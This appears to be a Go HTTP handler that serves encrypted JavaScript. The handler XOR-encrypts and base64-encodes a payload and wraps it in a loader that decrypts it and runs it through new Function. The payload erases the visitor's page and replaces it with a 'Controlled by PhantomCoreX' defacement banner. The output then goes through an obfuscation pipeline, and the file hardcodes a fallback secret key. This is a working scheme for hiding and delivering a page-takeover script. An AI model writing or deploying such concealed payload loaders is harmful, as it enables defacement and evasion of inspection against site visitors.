package handlers

import (
	"encoding/base64"
	"fmt"
	"log"
	"net/http"
	"os"
	"secureserver/internal/security"

	"github.com/joho/godotenv"
)

func init() {
	// Load .env file
	if err := godotenv.Load(); err != nil {
		log.Fatal("Error loading .env file")
	}
}

func ServeProtectedJS(pipeline *security.Pipeline) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		// Set security headers
		w.Header().Set("Content-Type", "application/javascript")
		w.Header().Set("Cache-Control", "no-store, no-cache, must-revalidate")
		w.Header().Set("X-Content-Type-Options", "nosniff")

		// Get fixed encryption key from .env
		secretKey := os.Getenv("JS_SECRET_KEY")
		if secretKey == "" {
			secretKey = "2xLHEbZAJw6EAoxbPXlrdYleZJBOsXmg" // Fallback
		}

		// Define payload JavaScript
		payloadJS := `
            console.log("Executing script...");
            document.body.innerHTML = "";
            document.body.style.margin = "0";
            document.body.style.background = "#000";
            const div = document.createElement("div");
            div.style.cssText = "position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);font-size:24px;color:#00ff00;font-family:Arial;text-align:center;background:#000;padding:20px;border-radius:10px;box-shadow:0 0 10px rgba(0,255,0,0.3);z-index:999999;";
            div.textContent = "Controlled by PhantomCoreX";
            document.body.appendChild(div);
        `

		// Create decryption wrapper with fixed key
		wrappedJS := fmt.Sprintf(`
            (function(){
                const key = "%s"; // Base64 encoded key
                const code = "%s"; // Base64 encoded payload
                
                try {
                    // Decryption function
                    const decrypt = (k, c) => {
                        const kb = atob(k); // Decode key
                        const cb = atob(c); // Decode payload
                        let result = '';
                        
                        // XOR with fixed key
                        for(let i = 0; i < cb.length; i++) {
                            result += String.fromCharCode(cb.charCodeAt(i) ^ kb.charCodeAt(i %% kb.length));
                        }
                        return result;
                    };

                    // Decrypt and execute
                    const decrypted = decrypt(key, code);
                    (new Function(decrypted))();
                } catch(e) {
                    console.error("Decryption failed:", e);
                }
            })();
        `, base64.StdEncoding.EncodeToString([]byte(secretKey)),
			base64.StdEncoding.EncodeToString([]byte(payloadJS)))

		// Process through pipeline
		protected, err := pipeline.Process([]byte(wrappedJS))
		if err != nil {
			http.Error(w, "Processing failed", http.StatusInternalServerError)
			return
		}

		w.Write(protected)
	}
}

func isValidOrigin(origin string) bool {
	return origin == os.Getenv("ALLOWED_ORIGIN")
}
